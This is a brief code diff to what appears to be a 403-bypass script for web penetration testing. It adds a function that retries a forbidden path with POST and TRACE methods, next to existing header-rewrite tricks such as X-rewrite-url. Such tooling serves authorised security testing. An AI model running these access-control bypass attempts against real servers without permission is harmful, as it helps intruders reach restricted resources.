@@ -53,6 +53,11 @@ function header_bypass_methods() {
     make_request "${TARGET_URL}" "-H 'X-rewrite-url: ${TARGET_PATH}'"
 }
 
+function method_bypass() {
+    make_request "${TARGET_URL}/${TARGET_PATH}" "" "POST" "-H 'Content-Length: 0'"
+    make_request "${TARGET_URL}/${TARGET_PATH}" "" "TRACE"
+}
+
 if [[ $# -ne 2 ]]; then
     echo "Invalid arguments. Usage: ./403-bypass.sh [URL] [path]"
     exit 1
